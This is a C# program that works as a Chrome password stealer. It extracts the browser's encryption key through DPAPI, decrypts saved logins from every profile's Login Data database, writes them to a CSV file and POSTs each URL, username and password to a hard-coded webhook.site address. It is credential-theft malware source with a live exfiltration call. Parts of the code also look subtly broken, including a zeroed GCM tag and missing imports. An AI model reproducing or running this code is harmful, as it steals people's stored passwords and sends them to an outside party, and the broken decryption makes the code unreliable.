using System;
using System.IO;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using System.Net.Http;
using System.Collections.Generic;
using System.Threading.Tasks;

class ChromePasswordDecryptor
{
    private static readonly string ChromePathLocalState = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Google\Chrome\User Data\Local State");
    private static readonly string ChromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), @"AppData\Local\Google\Chrome\User Data");
    private static readonly HttpClient httpClient = new HttpClient();

    static async Task Main(string[] args)
    {
        try
        {
            byte[] secretKey = GetSecretKey();
            if (secretKey == null)
            {
                Console.WriteLine("[ERR] Chrome secretkey cannot be found");
                return;
            }

            string[] folders = Directory.GetDirectories(ChromePath, "Profile*");
            if (!folders.Length.Equals(0))
            {
                using (StreamWriter decryptPasswordFile = new StreamWriter("decrypted_password.csv", false, Encoding.UTF8))
                {
                    decryptPasswordFile.WriteLine("index,url,username,password");

                    foreach (var folder in folders)
                    {
                        string chromePathLoginDb = Path.Combine(folder, "Login Data");
                        if (File.Exists(chromePathLoginDb))
                        {
                            string tempFilePath = "Loginvault.db";
                            File.Copy(chromePathLoginDb, tempFilePath, true);

                            using (SQLiteConnection conn = new SQLiteConnection($"Data Source={tempFilePath};"))
                            {
                                conn.Open();
                                using (SQLiteCommand command = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", conn))
                                using (SQLiteDataReader reader = command.ExecuteReader())
                                {
                                    while (reader.Read())
                                    {
                                        string url = reader.GetString(0);
                                        string username = reader.GetString(1);
                                        byte[] ciphertext = GetBytes(reader.GetValue(2));

                                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username) && ciphertext.Length > 0)
                                        {
                                            string decryptedPassword = DecryptPassword(ciphertext, secretKey);
                                            decryptPasswordFile.WriteLine($"{url},{username},{decryptedPassword}");

                                            // Aquí se enviaría la información a tu webhook, pero ten en cuenta las implicaciones de seguridad
                                            var datos = new { texto = $"URL: {url}\nUser Name: {username}\nPassword: {decryptedPassword}\n" };
                                            var response = await httpClient.PostAsJsonAsync("https://webhook.site/3d90672f-a858-429a-a131-f76afb2a3956", datos);
                                            Console.WriteLine(await response.Content.ReadAsStringAsync());
                                        }
                                    }
                                }
                                conn.Close();
                            }
                            File.Delete(tempFilePath);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERR] {ex.Message}");
        }
    }

    private static byte[] GetSecretKey()
    {
        try
        {
            using (StreamReader reader = new StreamReader(ChromePathLocalState))
            {
                var localState = JObject.Parse(reader.ReadToEnd());
                string encryptedKeyBase64 = localState["os_crypt"]["encrypted_key"].ToString();
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
                encryptedKey = encryptedKey.Skip(5).ToArray(); // Remove DPAPI
                return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            return null;
        }
    }

    private static string DecryptPassword(byte[] ciphertext, byte[] secretKey)
    {
        try
        {
            byte[] iv = ciphertext.Skip(3).Take(12).ToArray();
            byte[] buffer = ciphertext.Skip(15).Take(ciphertext.Length - 31).ToArray();

            using (AesGcm aes = new AesGcm(secretKey))
            {
                byte[] plaintextBytes = new byte[buffer.Length];
                aes.Decrypt(iv, buffer, new byte[16], plaintextBytes);
                return Encoding.UTF8.GetString(plaintextBytes);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[ERR] Unable to decrypt: {ex.Message}");
            return "";
        }
    }

    private static byte[] GetBytes(object obj)
    {
        if (obj.GetType() == typeof(DBNull))
        {
            return new byte[0];
        }
        return (byte[])obj;
    }
}
